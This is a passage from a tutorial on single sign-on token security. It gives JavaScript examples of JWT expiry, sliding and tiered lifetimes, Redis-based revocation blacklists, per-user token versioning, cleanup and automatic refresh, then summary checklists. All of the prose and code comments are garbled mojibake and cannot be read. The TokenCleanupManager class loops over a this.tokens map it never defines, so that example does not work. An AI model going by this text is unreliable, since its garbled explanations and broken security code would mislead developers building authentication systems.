â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 5. â° è¿‡æœŸä¸æ’¤é”€æœºåˆ¶


### 5.1 ä¸ºä»€ä¹ˆéœ€è¦è¿‡æœŸå’Œæ’¤é”€


**é€šä¿—ç†è§£**ï¼šTokenå°±åƒæ˜¯"ä¸´æ—¶é€šè¡Œè¯"ï¼Œå¦‚æœæ°¸è¿œæœ‰æ•ˆï¼Œä¸€æ—¦è¢«ç›—ç”¨é£é™©å°±å¾ˆå¤§ã€‚å°±åƒé…’åº—æˆ¿å¡ï¼Œé€€æˆ¿åè¦å¤±æ•ˆï¼Œä¸¢å¤±åè¦èƒ½æŒ‚å¤±ã€‚

**è¿‡æœŸçš„å¿…è¦æ€§**ï¼š
```
ğŸ”¸ é™ä½è¢«ç›—ç”¨é£é™©
  Tokenè¢«ç›— + çŸ­æœŸè¿‡æœŸ = é£é™©æ—¶é—´çª—å£å°

ğŸ”¸ å¼ºåˆ¶å®šæœŸé‡æ–°è®¤è¯
  ç¡®ä¿ç”¨æˆ·èº«ä»½ä¾ç„¶æœ‰æ•ˆ

ğŸ”¸ å‡å°‘é•¿æœŸå­˜å‚¨é£é™©
  é¿å…Tokenåœ¨å®¢æˆ·ç«¯é•¿æœŸä¿å­˜
```

**æ’¤é”€çš„å¿…è¦æ€§**ï¼š
```
ğŸ”¸ ç”¨æˆ·ä¸»åŠ¨é€€å‡º
  ç”¨æˆ·ç‚¹å‡»é€€å‡ºæŒ‰é’® â†’ ç«‹å³å¤±æ•ˆ

ğŸ”¸ å®‰å…¨äº‹ä»¶å“åº”
  å‘ç°è´¦å·å¼‚å¸¸ â†’ ç«‹å³æ’¤é”€æ‰€æœ‰Token

ğŸ”¸ æƒé™å˜æ›´
  ç”¨æˆ·è§’è‰²æ”¹å˜ â†’ æ—§Tokenåº”è¯¥å¤±æ•ˆ
```

### 5.2 Tokenè¿‡æœŸç­–ç•¥


#### ğŸ”¸ å›ºå®šè¿‡æœŸæ—¶é—´

**åŸç†**ï¼šTokenåœ¨åˆ›å»ºæ—¶è®¾å®šå›ºå®šçš„è¿‡æœŸæ—¶é—´

```javascript
// åˆ›å»ºå¸¦è¿‡æœŸæ—¶é—´çš„Token
function createToken(userId) {
  const payload = {
    userId: userId,
    iat: Math.floor(Date.now() / 1000),  // ç­¾å‘æ—¶é—´
    exp: Math.floor(Date.now() / 1000) + (15 * 60)  // 15åˆ†é’Ÿåè¿‡æœŸ
  };
  
  return jwt.sign(payload, secretKey);
}

// éªŒè¯Tokenè¿‡æœŸ
function validateToken(token) {
  try {
    const decoded = jwt.verify(token, secretKey);
    const currentTime = Math.floor(Date.now() / 1000);
    
    if (decoded.exp < currentTime) {
      return { valid: false, error: 'Tokenå·²è¿‡æœŸ' };
    }
    
    return { valid: true, payload: decoded };
  } catch (error) {
    return { valid: false, error: 'Tokenæ— æ•ˆ' };
  }
}
```

#### ğŸ”¸ æ»‘åŠ¨è¿‡æœŸæ—¶é—´

**åŸç†**ï¼šTokenåœ¨æ¯æ¬¡ä½¿ç”¨æ—¶è‡ªåŠ¨å»¶æœŸ

```javascript
// æ»‘åŠ¨è¿‡æœŸTokenç®¡ç†
class SlidingTokenManager {
  constructor() {
    this.tokens = new Map();  // å­˜å‚¨Tokenå’Œæœ€åä½¿ç”¨æ—¶é—´
    this.timeout = 30 * 60 * 1000;  // 30åˆ†é’Ÿè¶…æ—¶
  }
  
  // åˆ›å»ºToken
  createToken(userId) {
    const token = generateRandomToken();
    this.tokens.set(token, {
      userId: userId,
      lastUsed: Date.now()
    });
    return token;
  }
  
  // éªŒè¯å¹¶æ›´æ–°Token
  validateToken(token) {
    const tokenData = this.tokens.get(token);
    if (!tokenData) {
      return { valid: false, error: 'Tokenä¸å­˜åœ¨' };
    }
    
    const now = Date.now();
    if (now - tokenData.lastUsed > this.timeout) {
      this.tokens.delete(token);  // åˆ é™¤è¿‡æœŸToken
      return { valid: false, error: 'Tokenå·²è¿‡æœŸ' };
    }
    
    // æ›´æ–°æœ€åä½¿ç”¨æ—¶é—´ï¼ˆæ»‘åŠ¨å»¶æœŸï¼‰
    tokenData.lastUsed = now;
    return { valid: true, userId: tokenData.userId };
  }
}
```

#### ğŸ”¸ åˆ†çº§è¿‡æœŸç­–ç•¥

**åŸç†**ï¼šä¸åŒæ•æ„Ÿçº§åˆ«çš„æ“ä½œä½¿ç”¨ä¸åŒè¿‡æœŸæ—¶é—´

```javascript
// åˆ†çº§Tokenç®¡ç†
const TOKEN_TYPES = {
  ACCESS: { timeout: 15 * 60 * 1000 },      // è®¿é—®Tokenï¼š15åˆ†é’Ÿ
  REFRESH: { timeout: 7 * 24 * 60 * 60 * 1000 }, // åˆ·æ–°Tokenï¼š7å¤©
  SENSITIVE: { timeout: 5 * 60 * 1000 }     // æ•æ„Ÿæ“ä½œTokenï¼š5åˆ†é’Ÿ
};

function createTypedToken(userId, type) {
  const config = TOKEN_TYPES[type];
  const payload = {
    userId: userId,
    type: type,
    exp: Math.floor(Date.now() / 1000) + Math.floor(config.timeout / 1000)
  };
  
  return jwt.sign(payload, secretKey);
}

// ä½¿ç”¨ç¤ºä¾‹
const accessToken = createTypedToken(userId, 'ACCESS');    // æ™®é€šè®¿é—®
const sensitiveToken = createTypedToken(userId, 'SENSITIVE'); // ä¿®æ”¹å¯†ç 
```

### 5.3 Tokenæ’¤é”€æœºåˆ¶


#### ğŸ”¸ é»‘åå•æœºåˆ¶

**åŸç†**ï¼šç»´æŠ¤ä¸€ä¸ªè¢«æ’¤é”€Tokençš„é»‘åå•

```javascript
// Tokené»‘åå•ç®¡ç†
class TokenBlacklist {
  constructor() {
    this.blacklist = new Set();
    this.redis = new Redis(); // ä½¿ç”¨Rediså­˜å‚¨ï¼Œæ”¯æŒè¿‡æœŸ
  }
  
  // æ’¤é”€Token
  async revokeToken(token) {
    const decoded = jwt.decode(token);
    if (decoded && decoded.exp) {
      // å°†TokenåŠ å…¥é»‘åå•ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ä¸Tokenä¸€è‡´
      const ttl = decoded.exp - Math.floor(Date.now() / 1000);
      if (ttl > 0) {
        await this.redis.setex(`blacklist:${token}`, ttl, '1');
      }
    }
  }
  
  // æ£€æŸ¥Tokenæ˜¯å¦è¢«æ’¤é”€
  async isRevoked(token) {
    const result = await this.redis.get(`blacklist:${token}`);
    return result !== null;
  }
  
  // éªŒè¯Tokenï¼ˆåŒ…å«æ’¤é”€æ£€æŸ¥ï¼‰
  async validateToken(token) {
    // 1. æ£€æŸ¥æ˜¯å¦è¢«æ’¤é”€
    if (await this.isRevoked(token)) {
      return { valid: false, error: 'Tokenå·²è¢«æ’¤é”€' };
    }
    
    // 2. éªŒè¯Tokenç­¾åå’Œè¿‡æœŸ
    try {
      const decoded = jwt.verify(token, secretKey);
      return { valid: true, payload: decoded };
    } catch (error) {
      return { valid: false, error: 'Tokenæ— æ•ˆ' };
    }
  }
}
```

#### ğŸ”¸ ç‰ˆæœ¬å·æœºåˆ¶

**åŸç†**ï¼šç»™ç”¨æˆ·åˆ†é…ç‰ˆæœ¬å·ï¼ŒTokenåŒ…å«ç‰ˆæœ¬å·ï¼Œç‰ˆæœ¬ä¸åŒ¹é…åˆ™æ— æ•ˆ

```javascript
// ç”¨æˆ·Tokenç‰ˆæœ¬ç®¡ç†
class UserTokenVersion {
  constructor() {
    this.userVersions = new Map();
  }
  
  // è·å–ç”¨æˆ·å½“å‰ç‰ˆæœ¬
  getUserVersion(userId) {
    return this.userVersions.get(userId) || 0;
  }
  
  // åˆ›å»ºåŒ…å«ç‰ˆæœ¬å·çš„Token
  createToken(userId) {
    const version = this.getUserVersion(userId);
    const payload = {
      userId: userId,
      version: version,
      exp: Math.floor(Date.now() / 1000) + (15 * 60)
    };
    
    return jwt.sign(payload, secretKey);
  }
  
  // æ’¤é”€ç”¨æˆ·æ‰€æœ‰Tokenï¼ˆç‰ˆæœ¬å·+1ï¼‰
  revokeAllUserTokens(userId) {
    const currentVersion = this.getUserVersion(userId);
    this.userVersions.set(userId, currentVersion + 1);
  }
  
  // éªŒè¯Tokenç‰ˆæœ¬
  validateToken(token) {
    try {
      const decoded = jwt.verify(token, secretKey);
      const currentVersion = this.getUserVersion(decoded.userId);
      
      if (decoded.version !== currentVersion) {
        return { valid: false, error: 'Tokenç‰ˆæœ¬è¿‡æœŸ' };
      }
      
      return { valid: true, payload: decoded };
    } catch (error) {
      return { valid: false, error: 'Tokenæ— æ•ˆ' };
    }
  }
}
```

### 5.4 è‡ªåŠ¨æ¸…ç†æœºåˆ¶


**åŸç†**ï¼šå®šæœŸæ¸…ç†è¿‡æœŸçš„Tokenå’Œé»‘åå•è®°å½•ï¼Œé¿å…å†…å­˜æ³„æ¼

```javascript
// è‡ªåŠ¨æ¸…ç†ç®¡ç†å™¨
class TokenCleanupManager {
  constructor() {
    this.cleanupInterval = 60 * 60 * 1000;  // æ¯å°æ—¶æ¸…ç†ä¸€æ¬¡
    this.startCleanup();
  }
  
  startCleanup() {
    setInterval(() => {
      this.cleanupExpiredTokens();
    }, this.cleanupInterval);
  }
  
  async cleanupExpiredTokens() {
    try {
      // æ¸…ç†Redisä¸­è¿‡æœŸçš„é»‘åå•è®°å½•ï¼ˆRedisè‡ªåŠ¨è¿‡æœŸï¼‰
      // æ¸…ç†å†…å­˜ä¸­çš„è¿‡æœŸæ•°æ®
      
      const now = Date.now();
      for (const [token, data] of this.tokens.entries()) {
        if (data.expireTime < now) {
          this.tokens.delete(token);
        }
      }
      
      console.log('Tokenæ¸…ç†å®Œæˆ');
    } catch (error) {
      console.error('Tokenæ¸…ç†å¤±è´¥:', error);
    }
  }
}
```

### 5.5 è¿‡æœŸå’Œæ’¤é”€çš„ç”¨æˆ·ä½“éªŒ


**æ— æ„ŸçŸ¥åˆ·æ–°ç­–ç•¥**ï¼š
```javascript
// å‰ç«¯è‡ªåŠ¨åˆ·æ–°Token
class AutoRefreshTokenManager {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
    this.refreshTimer = null;
  }
  
  // è®¾ç½®Tokenå¹¶å¯åŠ¨è‡ªåŠ¨åˆ·æ–°
  setTokens(accessToken, refreshToken) {
    this.accessToken = accessToken;
    this.refreshToken = refreshToken;
    
    // è§£æTokenè¿‡æœŸæ—¶é—´
    const decoded = jwt.decode(accessToken);
    const expireTime = decoded.exp * 1000;
    const now = Date.now();
    
    // åœ¨è¿‡æœŸå‰5åˆ†é’Ÿå¼€å§‹åˆ·æ–°
    const refreshTime = expireTime - now - (5 * 60 * 1000);
    
    if (refreshTime > 0) {
      this.refreshTimer = setTimeout(() => {
        this.refreshAccessToken();
      }, refreshTime);
    }
  }
  
  // åˆ·æ–°è®¿é—®Token
  async refreshAccessToken() {
    try {
      const response = await fetch('/api/token/refresh', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.refreshToken}`
        }
      });
      
      if (response.ok) {
        const { accessToken, refreshToken } = await response.json();
        this.setTokens(accessToken, refreshToken);
      } else {
        // åˆ·æ–°å¤±è´¥ï¼Œè·³è½¬åˆ°ç™»å½•é¡µ
        window.location.href = '/login';
      }
    } catch (error) {
      console.error('Tokenåˆ·æ–°å¤±è´¥:', error);
      window.location.href = '/login';
    }
  }
}
```

---

## 6. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 6.1 å¿…é¡»æŒæ¡çš„å®‰å…¨è¦ç‚¹


```
ğŸ”¸ é˜²é‡æ”¾æ”»å‡»ï¼šæ—¶é—´æˆ³+éšæœºæ•°+ç­¾åä¸‰é‡éªŒè¯
ğŸ”¸ Tokenä¼ è¾“ï¼šå¼ºåˆ¶HTTPS+ç­¾åæ ¡éªŒ+å®‰å…¨å­˜å‚¨
ğŸ”¸ CSRFé˜²æŠ¤ï¼šTokenéªŒè¯+SameSite+Refereræ£€æŸ¥
ğŸ”¸ XSSé˜²æŠ¤ï¼šè¾“å…¥éªŒè¯+CSP+HttpOnly Cookie
ğŸ”¸ è¿‡æœŸæ’¤é”€ï¼šåˆ†çº§è¿‡æœŸ+é»‘åå•+ç‰ˆæœ¬æ§åˆ¶
```

### 6.2 å®‰å…¨é˜²æŠ¤å±‚æ¬¡å›¾


```
SSOå®‰å…¨é˜²æŠ¤ä½“ç³»ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            ä¼ è¾“å±‚å®‰å…¨               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ HTTPSå¼ºåˆ¶ + è¯ä¹¦éªŒè¯ + ç­¾åæ ¡éªŒ  â”‚â”‚ â† åŸºç¡€é˜²çº¿
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            åº”ç”¨å±‚å®‰å…¨               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ CSRF Token + XSSè¿‡æ»¤ + è¾“å…¥éªŒè¯ â”‚â”‚ â† åº”ç”¨é˜²çº¿
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            ä¼šè¯å±‚å®‰å…¨               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ Tokenè¿‡æœŸ + æ’¤é”€æœºåˆ¶ + ç‰ˆæœ¬æ§åˆ¶ â”‚â”‚ â† ä¼šè¯é˜²çº¿
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            ç›‘æ§å±‚å®‰å…¨               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ å¼‚å¸¸æ£€æµ‹ + æ—¥å¿—å®¡è®¡ + å®æ—¶å‘Šè­¦   â”‚â”‚ â† ç›‘æ§é˜²çº¿
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 6.3 å®è·µå»ºè®®


**ğŸ”¹ å¼€å‘é˜¶æ®µ**ï¼š
- ä»è®¾è®¡å¼€å§‹å°±è€ƒè™‘å®‰å…¨æ€§
- ä½¿ç”¨æˆç†Ÿçš„å®‰å…¨æ¡†æ¶å’Œåº“
- è¿›è¡Œå®‰å…¨ä»£ç å®¡æŸ¥

**ğŸ”¹ æµ‹è¯•é˜¶æ®µ**ï¼š
- è¿›è¡Œæ¸—é€æµ‹è¯•
- ä½¿ç”¨å®‰å…¨æ‰«æå·¥å…·
- æ¨¡æ‹Ÿå„ç§æ”»å‡»åœºæ™¯

**ğŸ”¹ éƒ¨ç½²é˜¶æ®µ**ï¼š
- é…ç½®å®‰å…¨çš„æœåŠ¡å™¨ç¯å¢ƒ
- å¯ç”¨æ‰€æœ‰å®‰å…¨é˜²æŠ¤æªæ–½
- å®šæœŸæ›´æ–°å®‰å…¨è¡¥ä¸

**ğŸ”¹ è¿ç»´é˜¶æ®µ**ï¼š
- ç›‘æ§å¼‚å¸¸è®¿é—®è¡Œä¸º
- å®šæœŸå®¡æŸ¥å®‰å…¨æ—¥å¿—
- åˆ¶å®šå®‰å…¨äº‹ä»¶å“åº”è®¡åˆ’

### 6.4 å¸¸è§å®‰å…¨è¯¯åŒº


```
âŒ è¯¯åŒº1ï¼šåªä½¿ç”¨HTTPSå°±å®‰å…¨äº†
âœ… æ­£ç¡®ï¼šHTTPSåªæ˜¯åŸºç¡€ï¼Œè¿˜éœ€è¦åº”ç”¨å±‚é˜²æŠ¤

âŒ è¯¯åŒº2ï¼šTokenæ°¸ä¸è¿‡æœŸæ›´æ–¹ä¾¿
âœ… æ­£ç¡®ï¼šçŸ­æœŸè¿‡æœŸ+è‡ªåŠ¨åˆ·æ–°æ˜¯æœ€ä½³å®è·µ

âŒ è¯¯åŒº3ï¼šå‰ç«¯éªŒè¯è¶³ä»¥é˜²æ­¢XSS
âœ… æ­£ç¡®ï¼šå¿…é¡»åç«¯éªŒè¯+å¤šå±‚é˜²æŠ¤

âŒ è¯¯åŒº4ï¼šå¤æ‚çš„å¯†ç å°±è¶³å¤Ÿå®‰å…¨
âœ… æ­£ç¡®ï¼šéœ€è¦å¤šå› å­è®¤è¯+è¡Œä¸ºåˆ†æ

âŒ è¯¯åŒº5ï¼šå®‰å…¨åŠŸèƒ½å½±å“ç”¨æˆ·ä½“éªŒ
âœ… æ­£ç¡®ï¼šå¥½çš„å®‰å…¨è®¾è®¡æ˜¯æ— æ„ŸçŸ¥çš„
```

**æ ¸å¿ƒè®°å¿†**ï¼š
- å®‰å…¨æ˜¯ä¸€ä¸ªä½“ç³»ï¼Œä¸æ˜¯å•ç‚¹é˜²æŠ¤
- çºµæ·±é˜²å¾¡ï¼Œå¤šå±‚ä¿æŠ¤
- å®‰å…¨ä¸ä¾¿æ·éœ€è¦å¹³è¡¡
- å®šæœŸå®¡æŸ¥å’Œæ›´æ–°å®‰å…¨ç­–ç•¥